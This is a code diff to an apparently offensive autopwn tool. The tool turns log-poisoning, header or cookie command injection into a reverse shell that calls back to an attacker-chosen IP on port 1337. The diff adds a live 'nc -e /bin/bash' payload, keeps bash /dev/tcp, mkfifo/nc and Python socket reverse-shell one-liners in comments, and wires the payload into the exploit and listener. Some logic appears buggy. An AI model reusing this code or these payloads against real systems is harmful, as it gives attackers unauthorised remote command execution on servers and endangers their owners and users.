@@ -41,13 +41,14 @@ class Payload:
 
 		self.proxies = proxies
 		if initiate:
-			self.Attack()
+			self.Attack(attempt_shell)
 
 
 
 	def InvokeShell(self, exploit):
 		#Give some time to bind the listener
-		time.sleep(5)
+		time.sleep(3)
+		print(colored("[*] Triggering payload... " + exploit, 'green'))
 		self.hit(exploit)
 
 
@@ -66,7 +67,11 @@ class Payload:
 
 
 	def autopwn(self, attempt_shell, cookieres, headerres, logres):
-		payload = f"bash -i >& /dev/tcp/{attempt_shell}/1337 0>&1"
+		#payload = f"bash -i >& /dev/tcp/{attempt_shell}/1337 0>&1"
+		#payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {attempt_shell} 1337 >/tmp/f"
+		#payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attempt_shell}",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
+		payload = "nc {ip} 1337 -e /bin/bash"
+		payload = payload.replace('{ip}', attempt_shell)
 		if cookieres or headerres or logres == False:
 			print(colored("[-] No RCE Found. Autopwn impossible...", "red"))
 			return
@@ -75,20 +80,20 @@ class Payload:
 			# We don't have to gain rce from all the verified rce vectors. We just need one!
 			log = logres[0]
 			print(colored(f"[+] Attempting to pwn through vulnerable log file: {log}", 'green'))
-			exploit = log + f'&cmd='
+			exploit = log + f'&cmd=' + payload
 				
 		elif headerres:
-			malheaders = headerres[0][:-2] + payload 
+			exploit = headerres[0][:-2] + payload 
 			print(colored(f"[+] Attempting to pwn through vulnerable header: {header}", 'green'))
 
 		elif cookieres:
-			malreq = headerres[0][:-2] + payload
+			exploit = headerres[0][:-2] + payload
 			print(colored(f"[+] Attempting to pwn through vulnerable cookie: {cookie}", 'green'))
 
 
-		ExploitThread = threading.Thread(target=InvokeShell, args=(exploit,)) #Dev note: If this crashes add self,
+		ExploitThread = threading.Thread(target=self.InvokeShell, args=[exploit]) #It works, don't touch!
 		ExploitThread.start()
-		print("[!] If you don't receive a webshell in 10 seconds, the exploit failed.", 'red')
+		print(colored("[!] If you don't receive a webshell in 10 seconds, the exploit failed. Try using another payload through modes", 'red'))
 		# Spin up the listener to catch the revshell and fire out the exploit
 		l = listen(1337)
 		conn = l.wait_for_connection()
@@ -264,7 +269,8 @@ class Payload:
 
 	def logPoisonCheck(self):
 		headers = {"User-Agent": self.payload}
-		response = requests.get(self.url, headers=fetchUA())
+		print(headers)
+		response = requests.get(self.url, headers=headers)
 		if self.verbosity > 1:
 			print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: Log Poisoning based on server type.')
 		# checks the type of the server
